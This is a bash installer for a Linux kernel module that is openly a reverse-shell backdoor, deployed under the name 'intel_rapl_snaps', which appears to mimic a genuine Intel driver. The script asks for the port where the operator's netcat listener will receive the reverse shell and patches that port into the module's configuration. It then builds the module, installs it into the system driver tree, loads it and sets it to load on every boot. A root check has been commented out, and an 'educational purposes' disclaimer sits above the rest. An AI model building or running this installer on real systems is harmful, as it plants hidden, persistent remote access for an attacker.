#!/bin/bash

#   Install Script
# This script configures and installs the  Linux kernel module

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
cat << "EOF"
  ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ▒░▒   ░  ░ ░  ░░ ░ ▒  ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░░   ░    ░    ░    ░  ░    ░    ░     ░ ░    ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░        ░  ░ ░       ░         ░  ░    ░  ░ ░      ░ ░           ░ 
                      ░       ░                                        

                      INSTALLER
EOF
echo -e "${NC}"

echo -e "${YELLOW}[!] WARNING: This is a for educational/research purposes only!${NC}"
echo -e "${YELLOW}[!] Use responsibly and only on systems you own or have permission to test.${NC}"
echo ""

# Check if running as root - restriction removed
# if [[ $EUID -eq 0 ]]; then
#    echo -e "${RED}[!] This script should not be run as root during configuration phase.${NC}"
#    echo -e "${RED}[!] Root privileges will be requested when needed for installation.${NC}"
#    exit 1
# fi

# Check for required tools
echo -e "${BLUE}[*] Checking system requirements...${NC}"

# Check if kernel headers are installed
if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
    echo -e "${RED}[!] Kernel headers not found. Please install kernel headers first:${NC}"
    echo -e "${YELLOW}    Ubuntu/Debian: sudo apt install linux-headers-\$(uname -r)${NC}"
    echo -e "${YELLOW}    CentOS/RHEL: sudo yum install kernel-devel${NC}"
    echo -e "${YELLOW}    Arch: sudo pacman -S linux-headers${NC}"
    exit 1
fi

# Check for make
if ! command -v make &> /dev/null; then
    echo -e "${RED}[!] 'make' is required but not installed.${NC}"
    exit 1
fi

# Check for gcc
if ! command -v gcc &> /dev/null; then
    echo -e "${RED}[!] 'gcc' is required but not installed.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] System requirements satisfied.${NC}"
echo ""

# Get current configuration
echo -e "${BLUE}[*] Current configuration:${NC}"
CURRENT_IP=$(grep "YOUR_SRV_IP" config.h | cut -d'"' -f2)
CURRENT_PORT=$(grep "YOUR_SRV_PORT" config.h | awk '{print $3}')

echo -e "  Server IP: ${YELLOW}$CURRENT_IP${NC}"
echo -e "  Server Port: ${YELLOW}$CURRENT_PORT${NC}"
echo ""

# Prompt for configuration
echo -e "${BLUE}[*] Configuration Setup${NC}"
echo -e "${YELLOW}[!] Enter the port where you will run netcat to receive the reverse shell:${NC}"
read -p "Server Port [$CURRENT_PORT]: " NEW_PORT
NEW_PORT=${NEW_PORT:-$CURRENT_PORT}

# Validate port
if ! [[ "$NEW_PORT" =~ ^[0-9]+$ ]] || [ "$NEW_PORT" -lt 1 ] || [ "$NEW_PORT" -gt 65535 ]; then
    echo -e "${RED}[!] Invalid port number. Must be between 1-65535.${NC}"
    exit 1
fi

echo ""
echo -e "${BLUE}[*] New configuration:${NC}"
echo -e "  Server IP: ${YELLOW}$CURRENT_IP${NC} (unchanged)"
echo -e "  Server Port: ${GREEN}$NEW_PORT${NC}"
echo ""

# Backup original config
echo -e "${BLUE}[*] Backing up original config.h...${NC}"
cp config.h config.h.backup

# Update configuration
echo -e "${BLUE}[*] Updating configuration...${NC}"
sed -i "s/#define YOUR_SRV_PORT.*/#define YOUR_SRV_PORT $NEW_PORT/" config.h

echo -e "${GREEN}[+] Configuration updated successfully.${NC}"

# Clean previous builds
echo -e "${BLUE}[*] Cleaning previous builds...${NC}"
make clean > /dev/null 2>&1 || true

# Build the module
echo -e "${BLUE}[*] Building kernel module...${NC}"
if make; then
    echo -e "${GREEN}[+] Module built successfully.${NC}"
else
    echo -e "${RED}[!] Build failed. Check the output above for errors.${NC}"
    echo -e "${BLUE}[*] Restoring original configuration...${NC}"
    mv config.h.backup config.h
    exit 1
fi

# Check if module file exists
if [ ! -f "intel_rapl_snaps.ko" ]; then
    echo -e "${RED}[!] Module file not found after build.${NC}"
    exit 1
fi

echo ""
echo -e "${GREEN}[+] Build completed successfully!${NC}"
echo -e "${BLUE}[*] Module file: intel_rapl_snaps.ko${NC}"
echo ""

# Install the module
echo -e "${BLUE}[*] Installing kernel module...${NC}"
CURRENT_DIR=$(pwd)

# Create directory structure and install module
if sudo mkdir -p /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_snaps; then
    echo -e "${GREEN}[+] Created module directory${NC}"
else
    echo -e "${RED}[!] Failed to create module directory${NC}"
    exit 1
fi

# Copy module to system location
if sudo cp "$CURRENT_DIR/intel_rapl_snaps.ko" /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_snaps/; then
    echo -e "${GREEN}[+] Module copied to system directory${NC}"
else
    echo -e "${RED}[!] Failed to copy module${NC}"
    exit 1
fi

# Load the module
if sudo insmod /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_snaps/intel_rapl_snaps.ko; then
    echo -e "${GREEN}[+] Module loaded successfully${NC}"
else
    echo -e "${RED}[!] Failed to load module${NC}"
    exit 1
fi

# Update module dependencies
echo -e "${BLUE}[*] Updating module dependencies...${NC}"
sudo depmod -a

# Add to auto-load configuration
echo -e "${BLUE}[*] Configuring auto-load...${NC}"
echo "intel_rapl_snaps" | sudo tee /etc/modules-load.d/intel_rapl_snaps.conf > /dev/null

# Load with modprobe
if sudo modprobe intel_rapl_snaps; then
    echo -e "${GREEN}[+] Module configured for auto-load${NC}"
else
    echo -e "${YELLOW}[!] Module already loaded${NC}"
fi

echo ""
echo -e "${GREEN}[+] Installation completed successfully!${NC}"

# Verify module is loaded
echo -e "${BLUE}[*] Verifying module is loaded...${NC}"
if lsmod | grep -q intel_rapl_snaps; then
    echo -e "${GREEN}[+] Module is now active and will auto-load on boot${NC}"
else
    echo -e "${YELLOW}[!] Warning: Module may not be loaded properly${NC}"
fi
